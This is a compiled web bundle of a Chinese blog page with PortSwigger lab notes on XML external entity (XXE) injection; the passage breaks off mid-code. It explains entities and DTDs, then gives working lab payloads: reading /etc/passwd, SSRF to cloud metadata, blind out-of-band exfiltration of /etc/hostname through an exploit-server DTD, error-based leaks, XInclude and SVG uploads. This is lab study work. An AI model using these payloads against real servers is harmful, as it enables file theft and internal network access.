"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[4133],{5665:(e,n,s)=>{s.d(n,{A:()=>d});const d=s.p+"assets/images/image-20250512145406200-12951806260277f1604f4c080ecca420.png"},28453:(e,n,s)=>{s.d(n,{R:()=>l,x:()=>r});var d=s(96540);const i={},c=d.createContext(i);function l(e){const n=d.useContext(c);return d.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:l(e.components),d.createElement(c.Provider,{value:n},e.children)}},31100:(e,n,s)=>{s.d(n,{A:()=>d});const d=s.p+"assets/images/image-20250512162934398-ed92b4c8df26191548048dbfb9f7bcc7.png"},32478:(e,n,s)=>{s.d(n,{A:()=>d});const d=s.p+"assets/images/image-20250512154957781-aae5701158df001bb8074f194afecb76.png"},35517:(e,n,s)=>{s.d(n,{A:()=>d});const d=s.p+"assets/images/image-20250512151542240-b543471cc03ac65a672b480cedf07a25.png"},37570:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>t,contentTitle:()=>r,default:()=>h,frontMatter:()=>l,metadata:()=>d,toc:()=>x});const d=JSON.parse('{"id":"PortSwigger/web-security/XXE","title":"XXE","description":"XML external entity injection","source":"@site/docs/PortSwigger/web-security/XXE.md","sourceDirName":"PortSwigger/web-security","slug":"/PortSwigger/web-security/XXE","permalink":"/docs/PortSwigger/web-security/XXE","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/PortSwigger/web-security/XXE.md","tags":[],"version":"current","frontMatter":{},"sidebar":"PortSwiggerSidebar","previous":{"title":"XSS","permalink":"/docs/PortSwigger/web-security/XSS"},"next":{"title":"\u4fe1\u606f\u6cc4\u9732","permalink":"/docs/PortSwigger/web-security/\u4fe1\u606f\u6cc4\u9732"}}');var i=s(74848),c=s(28453);const l={},r=void 0,t={},x=[{value:"XML external entity injection",id:"xml-external-entity-injection",level:2},{value:"XML \u5b9e\u4f53",id:"xml-\u5b9e\u4f53",level:2},{value:"\u4ec0\u4e48\u662fXML\uff1f",id:"\u4ec0\u4e48\u662fxml",level:3},{value:"\u4ec0\u4e48\u662f XML \u5b9e\u4f53",id:"\u4ec0\u4e48\u662f-xml-\u5b9e\u4f53",level:3},{value:"\u4ec0\u4e48\u662f\u6587\u6863\u7c7b\u578b\u5b9a\u4e49\uff1f",id:"\u4ec0\u4e48\u662f\u6587\u6863\u7c7b\u578b\u5b9a\u4e49",level:3},{value:"XML \u81ea\u5b9a\u4e49\u5b9e\u4f53",id:"xml-\u81ea\u5b9a\u4e49\u5b9e\u4f53",level:3},{value:"XML \u5916\u90e8\u5b9e\u4f53",id:"xml-\u5916\u90e8\u5b9e\u4f53",level:3},{value:"XXE \u7684\u653b\u51fb\u7c7b\u578b",id:"xxe-\u7684\u653b\u51fb\u7c7b\u578b",level:2},{value:"\u9884\u9632 XXE \u6f0f\u6d1e",id:"\u9884\u9632-xxe-\u6f0f\u6d1e",level:2},{value:"labs",id:"labs",level:2},{value:"XXE \u8bfb\u53d6\u6587\u4ef6",id:"xxe-\u8bfb\u53d6\u6587\u4ef6",level:3},{value:"\u5229\u7528 XXE \u6267\u884c SSRF",id:"\u5229\u7528-xxe-\u6267\u884c-ssrf",level:3},{value:"\u76f2 XXE \u5e26\u5916",id:"\u76f2-xxe-\u5e26\u5916",level:3},{value:"\u76f2 XXE \u5e26\u5916 \u53c2\u6570\u5b9e\u4f53",id:"\u76f2-xxe-\u5e26\u5916-\u53c2\u6570\u5b9e\u4f53",level:3},{value:"\u76f2 XXE \u52a0\u8f7d\u5916\u90e8dtd",id:"\u76f2-xxe-\u52a0\u8f7d\u5916\u90e8dtd",level:3},{value:"\u76f2 XXE \u901a\u8fc7\u9519\u8bef\u4fe1\u606f",id:"\u76f2-xxe-\u901a\u8fc7\u9519\u8bef\u4fe1\u606f",level:3},{value:"XInclude \u653b\u51fb",id:"xinclude-\u653b\u51fb",level:3},{value:"XXE \u6587\u4ef6\u4e0a\u4f20",id:"xxe-\u6587\u4ef6\u4e0a\u4f20",level:3},{value:"\u901a\u8fc7\u91cd\u65b0\u5b9a\u4e49\u672c\u5730DTD",id:"\u901a\u8fc7\u91cd\u65b0\u5b9a\u4e49\u672c\u5730dtd",level:3}];function a(e){const n={a:"a",code:"code",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,c.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h2,{id:"xml-external-entity-injection",children:"XML external entity injection"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"XXE"}),"\uff08XML\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\uff09"]}),"\n",(0,i.jsxs)(n.p,{children:["XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\uff08\u4e5f\u79f0\u4e3a ",(0,i.jsx)(n.code,{children:"XXE"}),"\uff09\u662f\u4e00\u79cd\u7f51\u7edc\u5b89\u5168\u6f0f\u6d1e\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u5e72\u6270\u5e94\u7528\u7a0b\u5e8f\u5904\u7406 XML \u6570\u636e\u7684\u65b9\u5f0f\u3002\u8fd9\u901a\u5e38\u5141\u8bb8\u653b\u51fb\u8005\u67e5\u770b\u5e94\u7528\u7a0b\u5e8f\u670d\u52a1\u5668\u6587\u4ef6\u7cfb\u7edf\u4e0a\u7684\u6587\u4ef6\uff0c\u4ee5\u53ca\u4e0e\u5e94\u7528\u7a0b\u5e8f\u672c\u8eab\u53ef\u4ee5\u8bbf\u95ee\u7684\u4efb\u4f55\u540e\u7aef\u6216\u5916\u90e8\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u3002"]}),"\n",(0,i.jsxs)(n.p,{children:["\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528",(0,i.jsx)(n.code,{children:"XXE"}),"\u6f0f\u6d1e\u6267\u884c\uff08",(0,i.jsx)(n.code,{children:"SSRF"}),"\uff09\u653b\u51fb\uff0c\u4ece\u800c\u5c06",(0,i.jsx)(n.code,{children:"XXE"}),"\u653b\u51fb\u63d0\u5347\u4e3a\u635f\u5bb3\u5e95\u5c42\u670d\u52a1\u5668\u6216\u5176\u4ed6\u540e\u7aef\u57fa\u7840\u8bbe\u65bd\u3002"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"xxe-injection",src:s(37676).A+"",width:"781",height:"440"})}),"\n",(0,i.jsx)(n.h2,{id:"xml-\u5b9e\u4f53",children:"XML \u5b9e\u4f53"}),"\n",(0,i.jsx)(n.h3,{id:"\u4ec0\u4e48\u662fxml",children:"\u4ec0\u4e48\u662fXML\uff1f"}),"\n",(0,i.jsxs)(n.p,{children:["XML \u4ee3\u8868",(0,i.jsx)(n.code,{children:"\u53ef\u6269\u5c55\u6807\u8bb0\u8bed\u8a00"}),"\u3002XML \u662f\u4e00\u79cd\u7528\u4e8e\u5b58\u50a8\u548c\u4f20\u8f93\u6570\u636e\u7684\u8bed\u8a00\u3002\u4e0e HTML \u7c7b\u4f3c\uff0cXML \u4f7f\u7528",(0,i.jsx)(n.strong,{children:"\u6807\u7b7e\u548c\u6570\u636e\u6784\u6210\u7684\u6811\u72b6\u7ed3\u6784"}),"\u3002\u4e0e HTML  \u4e0d\u540c\uff0cXML \u4e0d\u4f7f\u7528\u9884\u5b9a\u4e49\u7684\u6807\u7b7e\uff0c\u56e0\u6b64\u6807\u7b7e\u53ef\u4ee5\u53d6\u63cf\u8ff0\u6570\u636e\u7684\u540d\u79f0\u3002\u5728\u4e92\u8054\u7f51\u65e9\u671f\uff0cXML  \u66fe\u4f5c\u4e3a\u6570\u636e\u4f20\u8f93\u683c\u5f0f\u800c\u6d41\u884c\uff08\u201cAJAX\u201d\u4e2d\u7684\u201cX\u201d\u4ee3\u8868\u201cXML\u201d\uff09\u3002\u4f46\u5982\u4eca\uff0c\u5176\u53d7\u6b22\u8fce\u7a0b\u5ea6\u5df2\u7ecf\u4e0b\u964d\uff0c\u8f6c\u800c\u652f\u6301",(0,i.jsx)(n.code,{children:"json"}),"\u683c\u5f0f\u3002"]}),"\n",(0,i.jsx)(n.h3,{id:"\u4ec0\u4e48\u662f-xml-\u5b9e\u4f53",children:"\u4ec0\u4e48\u662f XML \u5b9e\u4f53"}),"\n",(0,i.jsxs)(n.p,{children:["XML \u5b9e\u4f53\u662f\u8868\u793a XML \u6587\u6863\u4e2d\u6570\u636e\u9879\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u800c\u4e0d\u662f\u4f7f\u7528\u6570\u636e\u672c\u8eab\u3002XML \u8bed\u8a00\u89c4\u8303\u4e2d\u5185\u7f6e\u4e86\u5404\u79cd\u5b9e\u4f53\u3002\u4f8b\u5982\uff0c\u5b9e\u4f53 ",(0,i.jsx)(n.code,{children:"<"})," \u548c ",(0,i.jsx)(n.code,{children:">"})," \u4ee3\u8868\u5b57\u7b26 ",(0,i.jsx)(n.code,{children:"<"})," \u548c ",(0,i.jsx)(n.code,{children:">"})," \u3002\u8fd9\u4e9b\u662f\u7528\u4e8e",(0,i.jsx)(n.strong,{children:"\u8868\u793a XML \u6807\u7b7e\u7684\u5143\u5b57\u7b26"}),"\uff0c\u56e0\u6b64\u901a\u5e38\u5728\u6570\u636e\u4e2d\u51fa\u73b0\u65f6\u5fc5\u987b\u4f7f\u7528\u5b83\u4eec\u7684\u5b9e\u4f53\u3002"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"\u5b9e\u4f53 &lt; \u548c &gt; \u4ee3\u8868\u5b57\u7b26 < \u548c >\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\u4ec0\u4e48\u662f\u6587\u6863\u7c7b\u578b\u5b9a\u4e49",children:"\u4ec0\u4e48\u662f\u6587\u6863\u7c7b\u578b\u5b9a\u4e49\uff1f"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"document type definition"}),"\uff08DTD\uff09"]}),"\n",(0,i.jsxs)(n.p,{children:["XML \u6587\u6863\u7c7b\u578b\u5b9a\u4e49\uff08DTD\uff09\u5305\u542b\u53ef\u4ee5\u5b9a\u4e49 XML \u6587\u6863\u7ed3\u6784\u3001\u5b83\u53ef\u4ee5\u5305\u542b\u7684\u6570\u636e\u503c\u7684\u7c7b\u578b\u4ee5\u53ca\u5176\u4ed6\u9879\u76ee\u7684\u58f0\u660e\u3002DTD \u53ef\u4ee5\u5728 XML \u6587\u6863\u5f00\u59cb\u5904\u7684\u53ef\u9009 ",(0,i.jsx)(n.code,{children:"DOCTYPE"})," \u5143\u7d20\u4e2d\u58f0\u660e\u3002DTD \u53ef\u4ee5\u662f\u5b8c\u5168\u5305\u542b\u5728\u6587\u6863\u672c\u8eab\u4e2d\uff08\u79f0\u4e3a\u201c\u5185\u90e8 DTD\u201d\uff09\u6216\u53ef\u4ee5\u4ece\u5176\u4ed6\u5730\u65b9\u52a0\u8f7d\uff08\u79f0\u4e3a\u201c\u5916\u90e8 DTD\u201d\uff09\u6216\u53ef\u4ee5\u662f\u4e24\u8005\u7684\u6df7\u5408\u4f53\u3002"]}),"\n",(0,i.jsx)(n.h3,{id:"xml-\u81ea\u5b9a\u4e49\u5b9e\u4f53",children:"XML \u81ea\u5b9a\u4e49\u5b9e\u4f53"}),"\n",(0,i.jsx)(n.p,{children:"XML \u5141\u8bb8\u5728 DTD \u4e2d\u5b9a\u4e49\u81ea\u5b9a\u4e49\u5b9e\u4f53\u3002\u4f8b\u5982\uff1a"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-dtd",children:'<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u8fd9\u4e2a\u5b9a\u4e49\u610f\u5473\u7740 XML \u6587\u6863\u4e2d\u4efb\u4f55\u5bf9\u5b9e\u4f53\u5f15\u7528 ",(0,i.jsx)(n.code,{children:"&myentity;"})," \u7684\u4f7f\u7528\u90fd\u5c06\u88ab\u66ff\u6362\u4e3a\u5b9a\u4e49\u7684\u503c\uff1a",(0,i.jsx)(n.code,{children:"my entity value"})]}),"\n",(0,i.jsx)(n.h3,{id:"xml-\u5916\u90e8\u5b9e\u4f53",children:"XML \u5916\u90e8\u5b9e\u4f53"}),"\n",(0,i.jsx)(n.p,{children:"XML \u5916\u90e8\u5b9e\u4f53\u662f\u4e00\u79cd\u81ea\u5b9a\u4e49\u5b9e\u4f53"}),"\n",(0,i.jsxs)(n.p,{children:["\u5916\u90e8\u5b9e\u4f53\u7684\u58f0\u660e\u4f7f\u7528 ",(0,i.jsx)(n.code,{children:"SYSTEM"})," \u5173\u952e\u5b57\uff0c\u5e76\u5fc5\u987b\u6307\u5b9a\u4e00\u4e2a URL\uff0c\u4ece\u8be5 URL \u52a0\u8f7d\u5b9e\u4f53\u7684\u503c\u3002\u4f8b\u5982\uff1a"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-dtd",children:'<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>\n'})}),"\n",(0,i.jsxs)(n.p,{children:["URL \u53ef\u4ee5\u4f7f\u7528 ",(0,i.jsx)(n.code,{children:"file://"})," \u534f\u8bae\uff0c\u56e0\u6b64\u5916\u90e8\u5b9e\u4f53\u53ef\u4ee5\u4ece\u6587\u4ef6\u4e2d\u52a0\u8f7d\u3002\u4f8b\u5982\uff1a"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-dtd",children:'<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>\n'})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"XML \u5916\u90e8\u5b9e\u4f53"}),"\u662f XML \u5916\u90e8\u5b9e\u4f53\u653b\u51fb\u4ea7\u751f\u7684\u4e3b\u8981\u539f\u56e0"]}),"\n",(0,i.jsx)(n.h2,{id:"xxe-\u7684\u653b\u51fb\u7c7b\u578b",children:"XXE \u7684\u653b\u51fb\u7c7b\u578b"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"file"}),"\u534f\u8bae\u8bfb\u53d6\u6587\u4ef6"]}),"\n",(0,i.jsxs)(n.li,{children:["\u5229\u7528",(0,i.jsx)(n.code,{children:"XXE"}),"\u6267\u884c ",(0,i.jsx)(n.code,{children:"SSRF "}),"\u653b\u51fb\uff0c\u5176\u4e2d\u5b9a\u4e49\u4e86\u4e00\u4e2a\u57fa\u4e8e\u540e\u7aef\u7cfb\u7edf URL \u7684\u5916\u90e8\u5b9e\u4f53"]}),"\n",(0,i.jsxs)(n.li,{children:["\u76f2",(0,i.jsx)(n.code,{children:"XXE"}),"\u8fdb\u884c\u5e26\u5916\u6570\u636e\u6cc4\u9732"]}),"\n",(0,i.jsxs)(n.li,{children:["\u76f2",(0,i.jsx)(n.code,{children:"XXE"}),"\u901a\u8fc7\u9519\u8bef\u6d88\u606f\u68c0\u7d22\u6570\u636e"]}),"\n"]}),"\n",(0,i.jsx)(n.h2,{id:"\u9884\u9632-xxe-\u6f0f\u6d1e",children:"\u9884\u9632 XXE \u6f0f\u6d1e"}),"\n",(0,i.jsxs)(n.p,{children:["\u901a\u5e38\uff0c\u7981\u7528",(0,i.jsx)(n.strong,{children:"\u5916\u90e8\u5b9e\u4f53\u89e3\u6790"}),"\u548c\u7981\u7528\u5bf9 ",(0,i.jsx)(n.code,{children:"XInclude"})," \u7684\u652f\u6301\u5c31\u8db3\u591f\u4e86"]}),"\n",(0,i.jsx)(n.h2,{id:"labs",children:"labs"}),"\n",(0,i.jsx)(n.h3,{id:"xxe-\u8bfb\u53d6\u6587\u4ef6",children:"XXE \u8bfb\u53d6\u6587\u4ef6"}),"\n",(0,i.jsx)(n.p,{children:"\u8fd9\u4e2a\u67e5\u8be2\u5546\u54c1\u5e93\u5b58\u7684\u529f\u80fd\uff0c\u4f7f\u7528xml\u683c\u5f0f\u4f20\u9012\u6570\u636e"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20250512144723907",src:s(55528).A+"",width:"760",height:"346"})}),"\n",(0,i.jsx)(n.p,{children:"\u5f15\u5165\u5916\u90e8\u5b9e\u4f53\uff0cfile\u534f\u8bae\u8bfb\u53d6\u6587\u4ef6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>\n<stockCheck>\n    <productId>&ext;</productId>\n    <storeId>1</storeId>\n</stockCheck>\n'})}),"\n",(0,i.jsx)(n.h3,{id:"\u5229\u7528-xxe-\u6267\u884c-ssrf",children:"\u5229\u7528 XXE \u6267\u884c SSRF"}),"\n",(0,i.jsx)(n.p,{children:"XXE \u653b\u51fb\u7684\u53e6\u4e00\u4e2a\u4e3b\u8981\u5f71\u54cd\u662f\u5b83\u4eec\u53ef\u4ee5\u7528\u6765\u6267\u884c\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020\uff08SSRF\uff09\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u8fd9\u662f\u4e00\u79cd\u6f5c\u5728\u7684\u4e25\u91cd\u6f0f\u6d1e\uff0c\u5176\u4e2d\u670d\u52a1\u5668\u7aef\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u88ab\u8bf1\u5bfc\u5411\u670d\u52a1\u5668\u53ef\u4ee5\u8bbf\u95ee\u7684\u4efb\u4f55 URL \u53d1\u8d77 HTTP \u8bf7\u6c42"}),"\n",(0,i.jsxs)(n.p,{children:["\u8bfb\u53d6",(0,i.jsx)(n.code,{children:"http://169.254.169.254/"}),"\u7684\u654f\u611f\u6570\u636e\uff0c\u9700\u8981\u8fed\u4ee3\u8bfb\u53d6\uff0c\u6700\u7ec8\u8bfb\u5230\u6570\u636e"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20250512145406200",src:s(5665).A+"",width:"1482",height:"674"})}),"\n",(0,i.jsx)(n.h3,{id:"\u76f2-xxe-\u5e26\u5916",children:"\u76f2 XXE \u5e26\u5916"}),"\n",(0,i.jsx)(n.p,{children:"\u8ddf\u4e0a\u4e00\u5173\u4e00\u6837\uff0c\u751f\u6210\u4e00\u4e2adnslog\uff0c\u89c2\u5bdf\u53cd\u5e94"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20250512151007272",src:s(41462).A+"",width:"1335",height:"683"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20250512151022568",src:s(84797).A+"",width:"1316",height:"661"})}),"\n",(0,i.jsxs)(n.p,{children:["\u53ef\u4ee5\u9a8c\u8bc1\u5b58\u5728\u76f2 ",(0,i.jsx)(n.code,{children:"XXE"}),"\u6f0f\u6d1e"]}),"\n",(0,i.jsx)(n.h3,{id:"\u76f2-xxe-\u5e26\u5916-\u53c2\u6570\u5b9e\u4f53",children:"\u76f2 XXE \u5e26\u5916 \u53c2\u6570\u5b9e\u4f53"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-dtd",children:'<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://075ppyh9w4pu697b2nnvnpatqkwbk48t.oastify.com" > %xxe; ]>\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u53c2\u6570\u5b9e\u4f53\uff08Parameter Entity\uff09\u662f XML \u4e2d\u7684\u4e00\u79cd\u7279\u6b8a\u5b9e\u4f53\uff0c\u7528\u4e8e\u5728 XML \u6587\u6863\u7684 DTD\uff08\u6587\u6863\u7c7b\u578b\u5b9a\u4e49\uff09\u4e2d\u5b9a\u4e49\u53ef\u91cd\u7528\u7684\u5185\u5bb9"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"%"})," \u7b26\u53f7\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u53c2\u6570\u5b9e\u4f53"]}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"%xxe;"})," \u662f\u5bf9\u4e0a\u8ff0\u5b9a\u4e49\u7684\u5f15\u7528"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20250512153550110",src:s(98008).A+"",width:"1294",height:"571"})}),"\n",(0,i.jsx)(n.h3,{id:"\u76f2-xxe-\u52a0\u8f7d\u5916\u90e8dtd",children:"\u76f2 XXE \u52a0\u8f7d\u5916\u90e8dtd"}),"\n",(0,i.jsxs)(n.p,{children:["\u7f16\u8f91\u4e00\u4e2a",(0,i.jsx)(n.code,{children:"DTD"}),"\uff0c\u653e\u5728\u670d\u52a1\u5668"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-dtd",children:'<!ENTITY % file SYSTEM "file:///etc/hostname">\n<!ENTITY % int "<!ENTITY &#37; send SYSTEM \'http://exploit-0a3a003803d23728807e98cd01da00ac.exploit-server.net/%file;\'>">\n%int;\n%send;\n'})}),"\n",(0,i.jsx)(n.p,{children:"payload:"}),"\n",(0,i.jsxs)(n.p,{children:["\u5229\u7528\u53c2\u6570\u5b9e\u4f53\uff0c\u5f15\u5165\u6211\u4eec\u670d\u52a1\u5668\u4e0a\u7684",(0,i.jsx)(n.code,{children:"DTD"}),"\u6587\u4ef6"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-dtd",children:'<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a3a003803d23728807e98cd01da00ac.exploit-server.net/exploit.dtd" > %xxe; ]>\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20250512154815700",src:s(90386).A+"",width:"1406",height:"697"})}),"\n",(0,i.jsx)(n.p,{children:"\u67e5\u770b\u8bbf\u95ee\u65e5\u5fd7\uff0c\u62ff\u5230hostname"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20250512154957781",src:s(32478).A+"",width:"1473",height:"83"})}),"\n",(0,i.jsx)(n.h3,{id:"\u76f2-xxe-\u901a\u8fc7\u9519\u8bef\u4fe1\u606f",children:"\u76f2 XXE \u901a\u8fc7\u9519\u8bef\u4fe1\u606f"}),"\n",(0,i.jsxs)(n.p,{children:["\u7f16\u8f91\u4e00\u4e2a",(0,i.jsx)(n.code,{children:"DTD"}),"\uff0c\u653e\u5728\u670d\u52a1\u5668"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-dtd",children:'<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % int "<!ENTITY &#37; send SYSTEM \'file:///invalid/%file;\'>">\n%int;\n%send;\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u5f15\u7528",(0,i.jsx)(n.code,{children:"DTD"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-dtd",children:'<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0af700560376e3fb8080438a01e9000b.exploit-server.net/exploit.dtd" > %xxe; ]>\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20250512160434094",src:s(57722).A+"",width:"1463",height:"716"})}),"\n",(0,i.jsx)(n.p,{children:"\u76f4\u63a5\u5c06\u6587\u4ef6\u5185\u5bb9\u5305\u542b\u51fa\u6765"}),"\n",(0,i.jsx)(n.h3,{id:"xinclude-\u653b\u51fb",children:"XInclude \u653b\u51fb"}),"\n",(0,i.jsx)(n.p,{children:"\u4e00\u4e9b\u5e94\u7528\u7a0b\u5e8f\u63a5\u6536\u5ba2\u6237\u7aef\u63d0\u4ea4\u7684\u6570\u636e\uff0c\u5c06\u5176\u5d4c\u5165\u5230\u670d\u52a1\u5668\u7aef\u7684 XML \u6587\u6863\u4e2d\uff0c\u7136\u540e\u89e3\u6790\u8be5\u6587\u6863\u3002"}),"\n",(0,i.jsxs)(n.p,{children:["\u4e00\u4e2a\u4f8b\u5b50\u662f\u5c06\u5ba2\u6237\u7aef\u63d0\u4ea4\u7684\u6570\u636e\u653e\u5165\u540e\u7aef",(0,i.jsx)(n.code,{children:"SOAP"}),"\u8bf7\u6c42\u4e2d\uff0c\u7136\u540e\u7531\u540e\u7aef",(0,i.jsx)(n.code,{children:"SOAP"}),"\u670d\u52a1\u8fdb\u884c\u5904\u7406\u3002"]}),"\n",(0,i.jsx)(n.p,{children:"SOAP\u6d88\u606f\u7684XML\u7ed3\u6784\u793a\u4f8b\uff1a"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-xml",children:'<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">\n    <soap:Header>\n        \x3c!-- \u53ef\u9009\u7684\u5934\u90e8\u4fe1\u606f --\x3e\n    </soap:Header>\n    <soap:Body>\n        \x3c!-- \u8bf7\u6c42\u6216\u54cd\u5e94\u6570\u636e --\x3e\n    </soap:Body>\n</soap:Envelope>\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"XInclude \u4ecb\u7ecd"})}),"\n",(0,i.jsx)(n.p,{children:"\u5bfc\u5165\u5916\u90e8xml\u6587\u6863\uff0c\u7c7b\u4f3c\u4e8ephp\u7684include\uff0c\u5c06\u5916\u90e8\u5b9a\u4e49\u7684dtd\u5f15\u5165\u5f53\u524d\u6587\u4ef6\uff0c\u56e0\u4e3a\u5f15\u5165\u5916\u90e8\u5b9e\u4f53\u5177\u6709\u5c40\u9650\u6027\uff0c\u6240\u4ee5\u4f7f\u7528xinclude\u6765\u5f15\u5165"}),"\n",(0,i.jsx)(n.p,{children:"\u6b63\u5e38\u8bf7\u6c42\u6570\u636e\u5305\uff1a"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20250512151542240",src:s(35517).A+"",width:"1424",height:"607"})}),"\n",(0,i.jsxs)(n.p,{children:["\u6267\u884c ",(0,i.jsx)(n.code,{children:"XInclude"})," \u653b\u51fb\uff0c\u9700\u8981\u5f15\u7528 ",(0,i.jsx)(n.code,{children:"XInclude"})," \u547d\u540d\u7a7a\u95f4\u5e76\u63d0\u4f9b\u8981\u5305\u542b\u7684\u6587\u4ef6\u8def\u5f84"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-xml",children:'<foo xmlns:xi="http://www.w3.org/2001/XInclude">\n<xi:include parse="text" href="file:///etc/passwd"/></foo>\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20250512152310246",src:s(83781).A+"",width:"1423",height:"709"})}),"\n",(0,i.jsx)(n.p,{children:"\u53c2\u8003\uff1a"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"https://www.cnblogs.com/hf99/p/9748536.html",children:"https://www.cnblogs.com/hf99/p/9748536.html"})}),"\n",(0,i.jsx)(n.h3,{id:"xxe-\u6587\u4ef6\u4e0a\u4f20",children:"XXE \u6587\u4ef6\u4e0a\u4f20"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"svg"}),"\u56fe\u7247\u7684\u683c\u5f0f\u662f",(0,i.jsx)(n.code,{children:"xml"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u5199\u5165svg\u6587\u4ef6\uff0c\u5728blog\u4e0b\u65b9\u4e0a\u4f20\u4f5c\u4e3a\u5934\u50cf"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20250512161951780",src:s(98389).A+"",width:"1378",height:"690"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.code,{children:"hostname\uff1acf3510b77286"})}),"\n",(0,i.jsx)(n.h3,{id:"\u901a\u8fc7\u91cd\u65b0\u5b9a\u4e49\u672c\u5730dtd",children:"\u901a\u8fc7\u91cd\u65b0\u5b9a\u4e49\u672c\u5730DTD"}),"\n",(0,i.jsxs)(n.p,{children:["\u4f7f\u7528GNOME\u684c\u9762\u73af\u5883\u7684\u7cfb\u7edf\u901a\u5e38\u5728",(0,i.jsx)(n.code,{children:"/usr/share/yelp/dtd/docbookx.dtd"}),"\u4e2d\u6709\u4e00\u4e2a",(0,i.jsx)(n.code,{children:"DTD"}),"\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u540d\u4e3a",(0,i.jsx)(n.code,{children:"ISOamso"}),"\u7684\u5b9e\u4f53"]}),"\n",(0,i.jsxs)(n.p,{children:["\u91cd\u65b0\u5b9a\u4e49",(0,i.jsx)(n.code,{children:"ISOamso"}),"\u7684\u5b9e\u4f53\uff0c\u5229\u7528\u9519\u8bef\u4fe1\u606f\u8bfb\u53d6",(0,i.jsx)(n.code,{children:"/ec/passwd"})]}),"\n",(0